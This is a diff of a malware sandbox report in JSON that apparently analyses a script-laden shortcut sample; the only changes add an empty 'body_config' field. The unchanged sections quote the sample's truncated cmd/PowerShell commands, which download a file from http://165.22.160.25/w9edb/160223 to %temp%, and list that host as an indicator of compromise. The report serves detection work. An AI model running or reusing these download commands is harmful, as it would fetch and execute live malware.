@@ -6,6 +6,7 @@
       {
         "auto_collapse": false,
         "body": "Sample uses unusual ShortCut objects",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -24,6 +25,7 @@
       {
         "auto_collapse": false,
         "body": "Sample uses a combination of both Visual Basic and JavaScript",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -42,6 +44,7 @@
       {
         "auto_collapse": false,
         "body": null,
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -53,6 +56,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[15]()\n",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -75,6 +79,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript runs Command Prompt via cmd.exe\n\t\tWScript.Shell[15].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...\n\t\tnew WshScriptExec[19](\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/1602...\n\t\t ws.exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\\...",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -97,6 +102,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript runs PowerShell via powershell.exe\n\t\t\t\t<param name=\"Item1\" value=\",cmd,/c start /min powershell IWR -uri http://165.22.160.25/w9edb/16022...\n\t\tWScript.Shell[15].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...\n\t\tnew WshScriptExec[19](\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/1602...\n\t\t ws.exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\\...",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -119,6 +125,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript runs PowerShell to call out to a URI\n\t\t\t\t<param name=\"Item1\" value=\",cmd,/c start /min powershell IWR -uri http://165.22.160.25/w9edb/16022...\n\t\tWScript.Shell[15].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...\n\t\tnew WshScriptExec[19](\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/1602...\n\t\t ws.exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\\...",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -141,6 +148,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript runs code via shell\n\t\tWScript.Shell[15].exec(\"cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160...",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -163,6 +171,12 @@
       {
         "auto_collapse": false,
         "body": "[{\"ioc_type\": \"ip\", \"ioc\": \"165.22.160.25\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://165.22.160.25/w9edb/160223\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/w9edb/160223\"}]",
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 0,
@@ -195,6 +209,12 @@
       {
         "auto_collapse": false,
         "body": "[{\"ioc_type\": \"ip\", \"ioc\": \"165.22.160.25\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://165.22.160.25/w9edb/160223\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/w9edb/160223\"}]",
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 0,
@@ -229,6 +249,7 @@
       {
         "auto_collapse": false,
         "body": "\t\tAn encoded literal was found: 0d0a093c21444f43545950452048544d4c3e0d0a093c212d2d5b6966206c742049452037205d3e3c68746d6c206c616e673d...",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
